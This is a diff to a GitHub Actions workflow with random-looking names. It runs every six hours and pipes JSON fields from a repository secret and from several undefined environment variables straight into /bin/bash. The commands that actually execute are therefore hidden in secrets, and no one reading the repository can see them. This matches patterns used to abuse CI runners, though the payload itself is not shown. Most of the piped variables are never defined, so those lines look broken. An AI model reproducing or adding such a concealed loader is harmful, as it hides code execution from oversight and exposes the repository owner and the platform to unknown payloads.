@@ -2,7 +2,8 @@ name: gaoshoz
 on:
   workflow_dispatch:
   schedule:
-    - cron: '42 2/6 * * *'
+    - cron: '8 1/6 * * *'
+
 jobs:
   build:
     runs-on: ubuntu-latest
@@ -11,19 +12,12 @@ jobs:
       - uses: actions/checkout@v4
       - name: gaoshoz
         env:
-          wf75513: ${{ secrets.wf75513 }}
+          e889: ${{ secrets.e889 }}
         run: |
-          echo $wf75513 | jq -r .eglc7101 | /bin/bash
-          echo $aqtc1 | jq -r .g7 | /bin/bash
-          echo $bb2 | jq -r .d92 | /bin/bash
-          echo $xry514 | jq -r .uojj67222 | /bin/bash
-          echo $r166 | jq -r .aahw34 | /bin/bash
-          echo $dbq85 | jq -r .nyub2725 | /bin/bash
-          echo $g256 | jq -r .iz4548 | /bin/bash
-          echo $hpgt948 | jq -r .ypo27 | /bin/bash
-          echo $nvm853 | jq -r .v145 | /bin/bash
-          echo $nfhhg35540 | jq -r .zwkls76 | /bin/bash
-          echo $dibmi83 | jq -r .x9 | /bin/bash
-          echo $gji462 | jq -r .hht6 | /bin/bash
-          echo $cywjr130 | jq -r .bxfv8 | /bin/bash
+          echo $e889 | jq -r .dgj7 | /bin/bash
+          echo $t2869 | jq -r .zla3 | /bin/bash
+          echo $c93631 | jq -r .peic48 | /bin/bash
+          echo $xam8 | jq -r .alj309 | /bin/bash
+          echo $dph5 | jq -r .bgx811 | /bin/bash
+          echo $dmsws704 | jq -r .vwlhb105 | /bin/bash
 
